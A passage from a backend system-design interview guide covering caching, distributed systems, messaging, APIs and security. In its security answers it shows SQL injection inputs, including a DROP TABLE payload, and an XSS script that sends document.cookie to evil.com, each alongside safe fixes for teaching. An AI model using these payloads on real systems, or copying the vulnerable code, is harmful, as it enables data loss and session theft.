**Benefits:**
- **Read scalability** — Route read queries to replicas, writes to primary.
- **High availability** — If the primary fails, promote a replica to become the new primary.
- **Disaster recovery** — Replicas can be in different geographic regions.

**Example:**

```
Setup: 1 primary + 2 read replicas

Write flow:
User updates profile → goes to PRIMARY
Primary writes to disk + replicates to replicas
→ Eventually all 3 are consistent

Read flow:
User views profile → load balancer routes to REPLICA 1 or REPLICA 2
→ Primary is free to handle writes

Traffic distribution with 10x reads vs writes:
All writes → Primary (handles 10% of traffic)
All reads  → 2 Replicas (handle 90% of traffic)
```

---

## Caching

---

### Q30. What is caching and why is it important?

**Answer:**

**Caching** is storing the results of expensive operations (database queries, API calls, complex computations) in a fast storage layer so future requests can be served from that fast store instead of repeating the expensive operation.

**The fundamental trade-off:** Speed vs freshness. Cached data may be stale if the underlying data changed.

**Cache locations:**
- **Browser cache** — Images, CSS, JS stored locally in the browser.
- **CDN cache** — Static assets stored at edge nodes geographically near users.
- **Application cache** — In-memory store (Redis, Memcached) between your app and database.
- **Database query cache** — DB caches results of frequent queries.

**Cache metrics:**
- **Hit rate** — % of requests served from cache. High hit rate = good.
- **Miss** — Cache doesn't have the data; must fetch from source.

**Example:**

```
Without cache:
User requests homepage → App queries DB for top 100 products → 200ms
1000 users/sec → 1000 DB queries/sec → DB overloaded!

With Redis cache:
User 1 requests homepage → Cache miss → App queries DB → 200ms
                         → Stores result in Redis with TTL=60 seconds

Users 2–1000 request homepage → Cache HIT → served from Redis → 5ms
DB receives only 1 query per 60 seconds instead of 1000/sec
```

---

### Q31. What is cache invalidation and why is it hard?

**Answer:**

**Cache invalidation** is the process of removing or updating cached data when the underlying source data changes, so users don't see stale information.

Phil Karlton famously said: *"There are only two hard things in Computer Science: cache invalidation and naming things."*

**Strategies:**

- **TTL (Time-To-Live)** — Cache entries expire after a fixed time. Simple but potentially stale for up to TTL period.
- **Cache-aside (Lazy invalidation)** — App reads cache first. On miss, reads DB and populates cache. On write, app deletes the cache entry (next read will re-populate).
- **Write-through** — Every write goes to cache AND DB simultaneously. Always consistent, but slower writes.
- **Write-back (Write-behind)** — Write to cache only, sync to DB asynchronously. Fastest writes, risk of data loss.

**Example:**

```
Cache-aside pattern:

Read:
1. Request for user_id=42
2. Check Redis: cache.get("user:42")
3. Cache HIT → return cached data
   Cache MISS → query DB → store in Redis with TTL → return data

Write:
1. User updates their name
2. Write new data to PostgreSQL
3. Delete "user:42" from Redis cache
4. Next read: cache miss → fetches fresh data from DB → re-caches

Problem: Race condition between Step 2 and Step 3.
If another request reads between write and delete,
they might cache the OLD value and serve it for TTL seconds.
```

---

### Q32. What is Redis and what are its use cases?

**Answer:**

**Redis (Remote Dictionary Server)** is an open-source, in-memory data store that serves as a database, cache, message broker, and more. Because data is stored in RAM, reads/writes are extremely fast (~sub-millisecond).

**Data structures Redis supports:**
- Strings, Lists, Sets, Sorted Sets, Hashes, Streams, Pub/Sub channels.

**Common use cases:**

1. **Caching** — Store database query results, API responses.
2. **Sessions** — Store user session data (faster and scalable vs DB-stored sessions).
3. **Rate limiting** — Track request counts per user per time window.
4. **Leaderboards** — Sorted sets are perfect for ranked lists.
5. **Pub/Sub** — Real-time messaging between services.
6. **Job queues** — Lightweight task queuing with Redis Lists.

**Example:**

```javascript
const redis = require("ioredis");
const client = new redis();

// Caching a DB result
async function getUser(id) {
  const cached = await client.get(`user:${id}`);
  if (cached) return JSON.parse(cached);

  const user = await db.query("SELECT * FROM users WHERE id = $1", [id]);
  await client.setex(`user:${id}`, 300, JSON.stringify(user)); // Cache for 5 min
  return user;
}

// Rate limiting: max 100 requests per minute per user
async function isRateLimited(userId) {
  const key = `ratelimit:${userId}:${Math.floor(Date.now() / 60000)}`;
  const count = await client.incr(key);
  if (count === 1) await client.expire(key, 60);
  return count > 100;
}

// Leaderboard
await client.zadd("game:scores", 5000, "alice");
await client.zadd("game:scores", 7500, "bob");
const top10 = await client.zrevrange("game:scores", 0, 9, "WITHSCORES");
// ["bob", "7500", "alice", "5000"]
```

---

## Scalability & Load Balancing

---

### Q33. What is the CAP theorem?

**Answer:**

The **CAP theorem** states that a distributed system can only guarantee **two out of three** properties simultaneously:

- **Consistency (C)** — Every read receives the most recent write or an error.
- **Availability (A)** — Every request receives a response (not an error), though it may not be the latest data.
- **Partition Tolerance (P)** — The system continues operating even when some nodes can't communicate with each other (network partition).

**The key insight:** In a distributed system, network partitions are inevitable. So the real choice is **CP vs AP**.

- **CP** (Consistent but not Available during partition): MongoDB, HBase, ZooKeeper. Returns an error rather than stale data during network issues.
- **AP** (Available but not Consistent during partition): Cassandra, DynamoDB, CouchDB. Returns possibly stale data but never fails.

**Example:**

```
Scenario: Two database nodes lose network connection to each other.

CP database (e.g., MongoDB with strict settings):
- Node A receives a write: user balance = $500
- Node A can't replicate to Node B (partition)
- Node A refuses reads: "I can't guarantee consistency right now"
- Returns error → system is unavailable but consistent

AP database (e.g., Cassandra):
- Node A receives a write: user balance = $500
- Can't replicate to Node B
- Node B still answers reads: returns $400 (old value)
- System is available but returning stale data

Which to choose?
- Banking: CP (never show wrong balance)
- Social media likes: AP (showing 1001 vs 1000 likes doesn't matter much)
```

---

### Q34. What is eventual consistency?

**Answer:**

**Eventual consistency** is a consistency model used in distributed systems. It guarantees that, given no new updates, all replicas will **eventually** converge to the same value. But at any given moment, different replicas may have different values.

This is the consistency model most AP systems (see CAP theorem) use. It trades strong consistency for availability and performance.

**Example:**

```
Instagram "likes" counter (simplified):

You like a post:
- Write goes to Replica A (US East)
- Replica A replicates to Replica B (US West) — takes 200ms

In those 200ms:
- Your friend in California reads from Replica B
- Sees: 1,000 likes (before your like)
- You read from Replica A
- Sees: 1,001 likes (your like is included)

After 200ms, both see 1,001 — eventually consistent.

This is acceptable for likes. NOT acceptable for:
- Bank account balances (you send $500 to two stores at once, both replicas approve)
- Inventory (overselling last concert ticket)
```

---

### Q35. What is rate limiting and how is it implemented?

**Answer:**

**Rate limiting** restricts how many requests a client can make to an API within a given time window. It protects servers from abuse, DDoS attacks, and unexpected traffic spikes.

**Common algorithms:**

- **Fixed Window** — Count requests per time window (e.g., 100 req per minute). Simple, but allows burst at window boundary.
- **Sliding Window** — Smoothly tracks requests over a rolling window. More accurate.
- **Token Bucket** — Users have a "bucket" of tokens. Each request consumes a token. Tokens refill at a fixed rate. Allows short bursts.
- **Leaky Bucket** — Requests enter a queue and are processed at a fixed rate. Smooths traffic.

**Example:**

```javascript
// Token Bucket Rate Limiting with Redis
async function checkRateLimit(userId, maxTokens = 10, refillRate = 1) {
  const key = `tokens:${userId}`;
  const now = Date.now();
  
  let data = await redis.hgetall(key);
  
  if (!data.tokens) {
    // First request — give full bucket
    await redis.hmset(key, { tokens: maxTokens, lastRefill: now });
    data = { tokens: maxTokens, lastRefill: now };
  }
  
  // Calculate tokens to add since last refill
  const elapsed = (now - parseInt(data.lastRefill)) / 1000;
  const tokensToAdd = elapsed * refillRate;
  const tokens = Math.min(maxTokens, parseFloat(data.tokens) + tokensToAdd);
  
  if (tokens < 1) {
    return { allowed: false, retryAfter: (1 - tokens) / refillRate };
  }
  
  await redis.hmset(key, { tokens: tokens - 1, lastRefill: now });
  return { allowed: true, remaining: tokens - 1 };
}

// HTTP response headers for clients:
// X-RateLimit-Limit: 100
// X-RateLimit-Remaining: 47
// X-RateLimit-Reset: 1735689600
// HTTP 429 Too Many Requests when limit is exceeded
```

---

## Microservices & APIs

---

### Q36. What is an API Gateway?

**Answer:**

An **API Gateway** is a server that acts as the single entry point for all client requests to your backend services. Instead of clients knowing about and calling each microservice directly, they call the gateway, which routes, transforms, authenticates, and aggregates requests.

**What an API Gateway does:**
- **Routing** — Routes `/users/*` to User Service, `/orders/*` to Order Service.
- **Authentication** — Validates JWT tokens before forwarding requests.
- **Rate limiting** — Enforces per-client request limits.
- **Request/Response transformation** — Convert XML to JSON, add/remove headers.
- **Aggregation** — One client request becomes multiple backend calls, results are merged.
- **SSL termination** — Handle HTTPS at the gateway, use HTTP internally.

**Examples:** AWS API Gateway, Kong, Nginx, Traefik.

**Example:**

```
Mobile app makes ONE request:
GET /dashboard

API Gateway:
├── Validates JWT token
├── Calls User Service: GET /users/42
├── Calls Orders Service: GET /orders?user_id=42
├── Calls Notifications Service: GET /notifications?user_id=42
├── Merges all responses
└── Returns combined JSON to client

Client receives everything it needs in one round trip.
Without gateway: client makes 3 separate requests, slower, more complex.
```

---

### Q37. What is GraphQL and how does it differ from REST?

**Answer:**

**GraphQL** is a query language and runtime for APIs, developed by Facebook. Instead of multiple REST endpoints, there's typically one endpoint. The client specifies exactly what data it needs.

**REST problems GraphQL solves:**
- **Overfetching** — REST returns fields you don't need. GraphQL returns only what you ask for.
- **Underfetching** — REST may require multiple round trips (get user → get user's posts → get each post's comments). GraphQL fetches it all in one query.
- **Versioning** — REST APIs need `/v1/`, `/v2/`. GraphQL evolves by adding fields, old clients still work.

**Example:**

```graphql
# GraphQL: Get exactly what you need in one request
query {
  user(id: "42") {
    name
    email
    orders(last: 5) {
      id
      total
      status
    }
  }
}

# Response — exactly what was asked, nothing more:
{
  "data": {
    "user": {
      "name": "Alice",
      "email": "alice@example.com",
      "orders": [
        { "id": "101", "total": 29.99, "status": "delivered" }
      ]
    }
  }
}
```

```
REST equivalent would require:
GET /users/42              → 20 fields (most unused)
GET /users/42/orders       → last 5 orders
→ 2 round trips, extra data
```

---

### Q38. What is gRPC?

**Answer:**

**gRPC** is a high-performance, open-source remote procedure call (RPC) framework developed by Google. Instead of REST's HTTP+JSON, gRPC uses HTTP/2 and **Protocol Buffers (protobuf)** — a binary serialization format that's smaller and faster than JSON.

**When to use gRPC:**
- **Service-to-service communication** in microservices (not browser-facing, because browsers don't support gRPC natively without a proxy).
- **Low-latency, high-throughput** requirements.
- **Strongly typed** contracts between services (defined in `.proto` files).
- Streaming (client streaming, server streaming, bidirectional streaming).

**Example:**

```protobuf
// user.proto — define the service contract
syntax = "proto3";

service UserService {
  rpc GetUser (GetUserRequest) returns (User);
  rpc ListUsers (ListUsersRequest) returns (stream User);
}

message GetUserRequest {
  int32 id = 1;
}

message User {
  int32 id = 1;
  string name = 2;
  string email = 3;
}
```

```python
# Server (Python)
class UserServicer(user_pb2_grpc.UserServiceServicer):
    def GetUser(self, request, context):
        user = db.get_user(request.id)
        return user_pb2.User(id=user.id, name=user.name, email=user.email)

# Client (Go)
resp, err := client.GetUser(ctx, &pb.GetUserRequest{Id: 42})
fmt.Println(resp.Name)  // "Alice"
```

---

### Q39. What is service discovery?

**Answer:**

In a microservices environment, services are constantly starting, stopping, and moving to different IP addresses (especially in Kubernetes). **Service discovery** is the mechanism by which services find and communicate with each other without hardcoding IP addresses.

**Two types:**

**Client-side discovery:** The client queries a **service registry** (e.g., Consul, Eureka) to get the list of available instances and chooses one itself.

**Server-side discovery:** The client sends a request to a router/load balancer (like Kubernetes `Service`), which queries the registry and routes the request.

**Example:**

```
Scenario: Order Service needs to call Payment Service

Without service discovery (bad):
payment_url = "http://192.168.1.45:8080"  # Hardcoded IP
# Payment service restarts → gets new IP 192.168.1.67 → Order service broken!

With service discovery (Consul):
1. Payment Service starts → registers itself: 
   { name: "payment-service", ip: "192.168.1.45", port: 8080, healthy: true }

2. Order Service queries Consul:
   GET /v1/catalog/service/payment-service
   → Returns list of healthy Payment instances

3. Order Service picks one and calls it

4. Payment Service restarts at new IP:
   → Deregisters old IP, registers new IP in Consul
   → Order Service discovers new IP on next lookup

Kubernetes equivalent: Use a Service object with a stable DNS name
payment-service.default.svc.cluster.local → always routes to healthy pods
```

---

## Message Queues & Async Systems

---

### Q40. What is Apache Kafka?

**Answer:**

**Apache Kafka** is a distributed event streaming platform designed for high-throughput, fault-tolerant, real-time data pipelines. Unlike traditional message queues (where messages are deleted after consumption), Kafka stores messages in **topics** as an ordered, immutable log that consumers can replay.

**Key concepts:**
- **Topic** — A named stream of messages. Like a database table for events.
- **Producer** — Writes messages to a topic.
- **Consumer** — Reads messages from a topic. Multiple consumer groups can read the same topic independently.
- **Partition** — Topics are split into partitions for parallelism. Each partition is an ordered log.
- **Offset** — The position of a message in a partition. Consumers track their offset.
- **Broker** — A Kafka server. Multiple brokers form a cluster.

**Example:**

```
E-commerce event streaming:

Topics:
- order-placed
- payment-processed
- inventory-updated
- email-notifications

Flow:
User places order
→ OrderService produces: { orderId: 123, userId: 42, total: 59.99 } to "order-placed"

Multiple consumers independently read "order-placed":
1. PaymentService: Charges credit card → produces to "payment-processed"
2. InventoryService: Reserves stock → produces to "inventory-updated"
3. AnalyticsService: Records for reporting
4. FraudService: Checks for fraud patterns

All four process the same event independently and at their own pace.
If EmailService is slow, it just falls behind — other services aren't blocked.
Kafka retains messages for 7 days (configurable) — services can replay history.
```

---

### Q41. What is the difference between a message queue and an event stream?

**Answer:**

Both move data between services asynchronously, but they have different semantics:

**Message Queue (e.g., RabbitMQ, AWS SQS):**
- Messages are meant to be **consumed once** by one consumer.
- Once a consumer reads and acknowledges a message, it's deleted.
- Used for **task distribution** — multiple workers compete to process jobs.
- Think: Work queue, email sending jobs, image processing jobs.

**Event Stream (e.g., Kafka, Kinesis):**
- Events are **retained** in a log, even after consumption.
- Multiple independent consumers can read the same event.
- Used for **event-driven architectures, audit logs, replay capability**.
- Think: Activity feed, audit trail, real-time analytics.

**Example:**

```
Queue use case — Image resizing job:
Producer: "Resize this image" → Queue
Worker A picks it up → resizes → deletes from queue
Worker B and C don't see it (already consumed)
10 workers = 10x throughput — work is distributed

Stream use case — User signed up event:
Producer: "User Alice signed up" → Kafka "user-events" topic
EmailService reads it → sends welcome email
AnalyticsService reads it → records signup metric
RecommendationService reads it → initializes recommendations
All three consumers see the same event independently

Key difference:
Queue: Each message processed by ONE consumer
Stream: Each message can be processed by MANY consumers
```

---

## Security

---

### Q42. What is JWT (JSON Web Token) and how does it work?

**Answer:**

**JWT** is a compact, self-contained token format for securely transmitting information between parties as a JSON object. It's commonly used for **authentication** and **authorization**.

**Structure:** Three Base64URL-encoded parts separated by dots: `header.payload.signature`

- **Header** — Token type (`JWT`) and algorithm used (`HS256`, `RS256`).
- **Payload** — Claims: user data (`userId`, `email`, `role`), expiration (`exp`), issued at (`iat`).
- **Signature** — `HMACSHA256(base64(header) + "." + base64(payload), secret)`. Proves the token hasn't been tampered with.

**How auth works:**
1. User logs in with credentials.
2. Server verifies, creates JWT, signs it, returns it.
3. Client stores JWT (localStorage or cookie).
4. Client sends JWT in every subsequent request: `Authorization: Bearer <token>`.
5. Server verifies signature — no database lookup needed!

**Example:**

```javascript
// Server: Creating a JWT
const jwt = require("jsonwebtoken");

const token = jwt.sign(
  { userId: 42, email: "alice@example.com", role: "admin" }, // payload
  process.env.JWT_SECRET,                                     // secret key
  { expiresIn: "24h" }                                        // expiration
);
// Returns: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQy...

// Client: Sending the JWT
fetch("/api/profile", {
  headers: { "Authorization": `Bearer ${token}` }
});

// Server: Verifying the JWT
app.use((req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1];
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded; // { userId: 42, email: "alice@...", role: "admin" }
    next();
  } catch {
    res.status(401).json({ error: "Invalid or expired token" });
  }
});
```

---

### Q43. What is OAuth 2.0?

**Answer:**

**OAuth 2.0** is an authorization framework that allows a third-party application to access a user's resources on another service without exposing the user's credentials.

The classic example: "Login with Google." You're not giving your Google password to the app — you're authorizing Google to share specific info with the app.

**Key roles:**
- **Resource Owner** — The user.
- **Client** — The third-party app requesting access.
- **Authorization Server** — Issues tokens (e.g., Google's auth servers).
- **Resource Server** — The API holding the user's data (e.g., Google Drive API).

**The flow (Authorization Code):**

**Example:**

```
User visits myapp.com → clicks "Login with Google"

1. myapp.com redirects user to:
   https://accounts.google.com/oauth/authorize
   ?client_id=myapp-123
   &redirect_uri=https://myapp.com/callback
   &scope=email profile
   &response_type=code

2. User sees Google's consent screen: 
   "myapp.com wants to access your: email, profile"
   User clicks "Allow"

3. Google redirects back to:
   https://myapp.com/callback?code=AUTH_CODE_XYZ

4. myapp.com's server exchanges the code for tokens:
   POST https://oauth2.googleapis.com/token
   { code: "AUTH_CODE_XYZ", client_id: "...", client_secret: "..." }
   → { access_token: "...", refresh_token: "...", expires_in: 3600 }

5. myapp.com uses access_token to call:
   GET https://www.googleapis.com/userinfo/v2/me
   Authorization: Bearer <access_token>
   → { email: "alice@gmail.com", name: "Alice Smith" }

6. myapp.com creates a session for Alice
```

---

### Q44. What is SQL injection and how do you prevent it?

**Answer:**

**SQL injection** is a code injection attack where malicious SQL is inserted into an input field, causing the database to execute unintended commands. It's one of the most common and dangerous web vulnerabilities.

**How it works:** When user input is concatenated directly into SQL strings, an attacker can close the string and inject their own SQL.

**Prevention:** Always use **parameterized queries** (prepared statements). Never concatenate user input into SQL strings.

**Example:**

```javascript
// VULNERABLE — Never do this!
const username = req.body.username; // User input: "admin'--"
const query = `SELECT * FROM users WHERE username = '${username}'`;
// Resulting SQL: SELECT * FROM users WHERE username = 'admin'--'
// The -- comments out the rest → logs in as admin without password!

// More destructive input: "'; DROP TABLE users;--"
// Resulting SQL: SELECT * FROM users WHERE username = ''; DROP TABLE users;--'
// Deletes the entire users table!

// SAFE — Parameterized queries
const { rows } = await db.query(
  "SELECT * FROM users WHERE username = $1",
  [username]  // username is treated as data, not SQL
);

// ORM (e.g., Prisma) is safe by default:
const user = await prisma.user.findFirst({
  where: { username: username }  // Automatically parameterized
});
```

---

### Q45. What is XSS (Cross-Site Scripting)?

**Answer:**

**XSS** is a security vulnerability where attackers inject malicious scripts into web pages viewed by other users. If your app displays user-provided content without sanitizing it, an attacker can execute arbitrary JavaScript in victims' browsers.

**Types:**
- **Stored XSS** — Malicious script is saved to the database and served to every user who views that content.
- **Reflected XSS** — Malicious script is in the URL; server reflects it back in the response.
- **DOM XSS** — Client-side JavaScript directly writes attacker-controlled data to the DOM.

**Prevention:** Escape user input before rendering it as HTML. Use Content Security Policy (CSP) headers.

**Example:**

```javascript
// Attacker submits a comment:
"Great article! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"

// VULNERABLE rendering (React without JSX, or innerHTML):
element.innerHTML = userComment; 
// Executes the script! Sends victim's cookies to evil.com.

// SAFE — React's JSX auto-escapes by default:
return <div>{userComment}</div>;
// Renders as text: "Great article! <script>...</script>" (shown literally, not executed)

// SAFE — Manual HTML encoding:
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// Content Security Policy header to prevent inline scripts:
// Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## Advanced System Design

---

### Q46. How would you design a URL shortener (like bit.ly)?

**Answer:**

This is a classic system design interview question. Let's break it down.

**Requirements:**
- Input: Long URL → Output: Short URL (e.g., `bit.ly/abc123`).
- Redirect short URL to long URL.
- Handle billions of URLs and high read traffic.

**Core design decisions:**

**ID generation:** Generate a unique 6-8 character code. Options:
1. Encode an auto-increment database ID in base62 (a-z, A-Z, 0-9).
2. Use MD5/SHA1 of the URL and take first 7 chars.
3. Use a random code and check for collisions.

**Database schema:**
```sql
CREATE TABLE urls (
  id BIGINT PRIMARY KEY,        -- auto-increment
  short_code VARCHAR(8) UNIQUE, -- "abc123"
  long_url TEXT,                -- "https://very-long-url.com/..."
  created_at TIMESTAMP,
  expires_at TIMESTAMP,
  click_count BIGINT DEFAULT 0
);
```

**Example flow:**

```
Create short URL:
POST /shorten { url: "https://www.example.com/very/long/path" }
1. Validate URL
2. Insert into DB → gets id=12345678
3. Encode 12345678 in base62 → "b7gTQx" (6 chars)
4. Store mapping: "b7gTQx" → "https://www.example.com/..."
5. Return: { short_url: "https://bit.ly/b7gTQx" }

Redirect:
GET /b7gTQx
1. Look up "b7gTQx" in Redis cache (most hot links)
2. Cache miss → query DB → cache result for 24h
3. Return: HTTP 301 (permanent) or 302 (temporary) redirect to long URL
4. Async: increment click counter

Scaling:
- Read-heavy (99% reads, 1% writes) → lots of read replicas
- Redis cache for hot short codes (most links follow power law: 20% of URLs = 80% of traffic)
- CDN for static assets
- For global scale: use consistent hashing for distributed caching
```

---

### Q47. How would you design a system like Twitter/X?

**Answer:**

This is one of the most famous system design problems, particularly around the **fanout problem**.

**Core features:** Post tweets, follow users, view timeline (feed), search tweets.

**The key challenge — Timeline generation:**

**Pull-based (Fan-out on read):**
When user A views their timeline, query all accounts they follow, merge their tweets, sort by time. Simple but expensive if you follow thousands of accounts.

**Push-based (Fan-out on write):**
When user A posts a tweet, push it to the timeline cache of all their followers. Viewing timeline is fast (just read from cache). But expensive for users with millions of followers (a celebrity's tweet triggers millions of cache writes!).

**Hybrid approach (Twitter's actual solution):**
- Regular users → fan-out on write (push to followers' caches).
- Celebrity users (>1M followers) → fan-out on read for their tweets specifically.

**Example:**

```
Data model:
users(id, username, bio, follower_count)
tweets(id, user_id, content, created_at, reply_to, retweet_of)
follows(follower_id, followee_id)

Timeline storage (Redis sorted set, sorted by timestamp):
Key: "timeline:{user_id}"
Value: list of tweet_ids sorted by time

Post tweet flow:
1. User 42 tweets "Hello world"
2. Tweet saved to DB: tweet_id=9999
3. Fan-out worker: Get all followers of user 42 (say 500 followers)
4. For each follower: ZADD "timeline:{follower_id}" timestamp tweet_id
5. Timeline cache updated for all 500 followers instantly

Read timeline:
1. User 77 opens app
2. ZREVRANGE "timeline:77" 0 49 → get 50 most recent tweet_ids
3. Batch fetch tweet details from Redis/DB
4. Return to client in <50ms

Celebrity problem:
Beyoncé tweets → 300M followers → 300M cache writes = impractical
Solution: Don't fan-out for celebrities.
On timeline read: fetch from precomputed user cache + inject celebrity tweets on the fly.
```

---

### Q48. What is consistent hashing?

**Answer:**

**Consistent hashing** is an algorithm for distributing data across nodes (servers/cache nodes) in a way that minimizes remapping when nodes are added or removed.

**The problem with naive hashing:**
`hash(key) % N` (where N = number of servers). If you add a server (N → N+1), almost every key maps to a different server — massive cache misses and data migration.

**Consistent hashing solution:**
Imagine a ring (0 to 2³²-1). Both keys and servers are hashed onto this ring. A key is served by the first server it encounters going clockwise.

- **Adding a server:** Only keys between the new server and its predecessor move. ~1/N of keys affected.
- **Removing a server:** Only keys on that server move to the next server. ~1/N affected.

**Example:**

```
Ring (simplified to 0-100):

Initial: 3 servers at positions 20, 50, 80

Key assignments:
"user:1" → hash=10 → closest server going clockwise → Server at 20
"user:2" → hash=35 → Server at 50
"user:3" → hash=65 → Server at 80
"user:4" → hash=90 → wraps around → Server at 20

Add new server at position 60:
"user:3" → hash=65 → now goes to server at 80 (unchanged)
"user:2" → hash=35 → still server at 50 (unchanged)
Only keys between 50-60 move to new server.
Minimal disruption!

Real usage: Memcached/Redis cluster, Cassandra, DynamoDB
```

---

### Q49. What is the Saga pattern in microservices?

**Answer:**

In microservices, each service has its own database. This means you can't use a single ACID database transaction across multiple services. The **Saga pattern** is a way to manage distributed transactions using a sequence of local transactions, each publishing events or messages to trigger the next step.

**Two types:**

**Choreography:** Each service listens for events and decides what to do. Decentralized, but harder to track overall flow.

**Orchestration:** A central **saga orchestrator** tells each service what to do and handles failures. Centralized, easier to track.

**Compensating transactions:** If a step fails, run compensating transactions to undo previous steps (like a manual rollback).

**Example:**

```
Order placement saga (Orchestration):

Orchestrator starts saga: "Place order for user 42, $100"

Step 1: Order Service → Create order (status: PENDING)
  ✅ Success → proceed

Step 2: Payment Service → Charge $100
  ✅ Success → proceed

Step 3: Inventory Service → Reserve items
  ❌ FAILURE: Out of stock!

Compensating transactions (undo previous steps):
← Refund $100 to user (undo Step 2)
← Cancel order, set status: FAILED (undo Step 1)

User sees: "Sorry, item out of stock. Your payment was not charged."

Without saga, you might charge the user but fail to reserve inventory —
inconsistent state across services.
```

---

### Q50. What is circuit breaker pattern?

**Answer:**

The **circuit breaker** is a design pattern that prevents cascading failures in distributed systems. When a service repeatedly fails, the circuit "opens" and subsequent requests fail immediately without even trying to call the failing service, giving it time to recover.

**Three states:**

- **Closed (normal)** — Requests pass through. Failures are counted.
- **Open (failing)** — Requests fail immediately with a fallback. No calls to the failing service.
- **Half-Open (testing)** — After a timeout, a few test requests go through. If they succeed, circuit closes. If they fail, it opens again.

**Example:**

```javascript
const CircuitBreaker = require("opossum");

async function callPaymentService(data) {
  const response = await fetch("http://payment-service/charge", {
    method: "POST",
    body: JSON.stringify(data)
  });
  return response.json();
}

const breaker = new CircuitBreaker(callPaymentService, {
  timeout: 3000,           // Fail if request takes > 3 seconds
  errorThresholdPercentage: 50, // Open circuit if >50% of requests fail
  resetTimeout: 30000      // Try again after 30 seconds
});

// Fallback when circuit is open:
breaker.fallback(() => ({ error: "Payment service unavailable, try later" }));

// Usage:
try {
  const result = await breaker.fire({ amount: 100, userId: 42 });
  console.log(result);
} catch (err) {
  console.log("Payment failed, circuit is open");
}

// Scenario:
// t=0: Payment service starts timing out
// t=10: 50% error rate → Circuit OPENS
// t=10-40: All requests fail instantly (fallback runs), payment service has breathing room
// t=40: Circuit HALF-OPENS, test request sent
// t=40: Test succeeds → Circuit CLOSES, normal operation resumes
```

---

### Q51. What is a Content Delivery Network's cache invalidation strategy?

**Answer:**

CDNs cache content at edge nodes globally. When you update your content (e.g., deploy new JS/CSS files), you need the CDN to serve the updated version, not the stale cached one. This is CDN cache invalidation.

**Strategies:**

**1. URL versioning (best practice):**
Change the file URL when content changes. Old URL stays cached; new URL is never cached yet.
- `styles.css?v=1` → `styles.css?v=2`
- Or with content hash: `styles.a3f4b.css` → `styles.c9e2a.css`

**2. Cache-Control headers:**
Set short TTLs for content that changes frequently. Set long TTLs for versioned assets.

**3. CDN Purge API:**
Explicitly tell the CDN to delete specific URLs from its cache. Takes effect immediately but may be slow to propagate to all edge nodes.

**Example:**

```
Build process (webpack/Vite) auto-generates content hashes:
main.abc123.js    ← HTML references this
styles.def456.css

Update app → new build:
main.xyz789.js    ← New hash because content changed
styles.def456.css ← Same hash if CSS unchanged

Deploy new HTML that references new hashes.
Old HTML (still cached) → still works (references still-valid old files)
New visitors → get new HTML → get new JS with new hash → fresh content

Cache-Control strategy:
# Short TTL for HTML (changes often, needs to be fresh):
Cache-Control: max-age=300 (5 minutes)

# Long TTL for versioned assets (hash in filename guarantees freshness):
Cache-Control: max-age=31536000, immutable (1 year)
```

---

### Q52. What is the difference between synchronous and asynchronous processing?

**Answer:**

**Synchronous processing:** The caller waits for the operation to complete before continuing. The caller is "blocked" during processing.

**Asynchronous processing:** The caller initiates an operation and continues without waiting. The result is delivered later via a callback, promise, event, or polling.

**Example:**

```javascript
// SYNCHRONOUS — sequential, blocking
function handleUserRegistration(userData) {
  const user = createUserInDB(userData);     // Wait for DB: 50ms
  sendWelcomeEmail(user.email);              // Wait for email: 500ms
  notifyAdmins(user);                        // Wait for notification: 200ms
  return user;
  // Total time: 750ms before responding to user
}

// ASYNCHRONOUS — initiate, don't wait
async function handleUserRegistration(userData) {
  const user = await createUserInDB(userData);  // Must wait: 50ms (core requirement)
  
  // Fire and forget — don't block the response:
  emailQueue.add({ type: "welcome", email: user.email });
  adminNotificationQueue.add({ userId: user.id });
  
  return user;
  // Total time: 50ms! User gets response immediately.
  // Email and notification happen in background workers.
}

// Real-world implication:
// Synchronous: User waits 750ms to see "Registration successful"
// Asynchronous: User sees "Registration successful" in 50ms
//               Email arrives 1-2 seconds later (still very fast from user perspective)
```

---

### Q53. How does a search engine like Elasticsearch work?

**Answer:**

**Elasticsearch** is a distributed search and analytics engine built on top of **Apache Lucene**. It excels at full-text search, log analysis, and real-time querying of large datasets.

**Core concepts:**

- **Index** — Like a database in SQL. Contains documents.
- **Document** — A JSON object. Like a row in SQL.
- **Inverted Index** — The magic behind fast search. Maps words to the documents containing them.
- **Shard** — An index is split into shards for distribution. Each shard is a Lucene index.
- **Replica** — Copy of a shard for redundancy and read performance.

**Inverted Index:**
```
Regular index: Document → Words
Inverted index: Word → Documents containing it

Documents:
  Doc 1: "The quick brown fox"
  Doc 2: "The lazy dog"
  Doc 3: "The quick dog"

Inverted Index:
  "quick" → [Doc 1, Doc 3]
  "brown" → [Doc 1]
  "fox"   → [Doc 1]
  "lazy"  → [Doc 2]
  "dog"   → [Doc 2, Doc 3]

Query: "quick dog"
→ Find "quick": [Doc 1, Doc 3]
→ Find "dog": [Doc 2, Doc 3]
→ Union: [Doc 1, Doc 2, Doc 3], ranked by relevance (Doc 3 matches both words → highest score)
```

**Example:**

```javascript
// Index a document
await client.index({
  index: "products",
  id: "1",
  document: {
    name: "iPhone 15 Pro Max",
    description: "Apple's flagship smartphone with titanium design",
    price: 1199,
    category: "electronics"
  }
});

// Search
const results = await client.search({
  index: "products",
  query: {
    bool: {
      must: [
        { match: { name: "iPhone" } },           // Full-text search
      ],
      filter: [
        { range: { price: { lte: 1500 } } },     // Filter by price
        { term: { category: "electronics" } }     // Exact match
      ]
    }
  },
  sort: [{ price: { order: "asc" } }]
});
```

---

### Q54. What is the write-ahead log (WAL) in databases?

**Answer:**

A **Write-Ahead Log (WAL)** is a technique used in databases to ensure durability and crash recovery. Before any changes are made to the actual data files, the change is first written to an append-only log. If the database crashes, it can replay the WAL to recover all committed transactions.

**Why "write-ahead":** You write to the log *before* you write to the data files.

**Benefits:**
- **Crash recovery** — Replay the log after a crash to restore consistent state.
- **Durability (the D in ACID)** — A transaction is durable as soon as it's in the WAL, even before data files are updated.
- **Replication** — PostgreSQL streaming replication works by shipping the WAL to replica servers.
- **Point-in-time recovery** — Replay WAL up to any specific point in time.

**Example:**

```
PostgreSQL WAL in action:

Transaction:
BEGIN;
UPDATE accounts SET balance = 900 WHERE id = 1;  -- was 1000
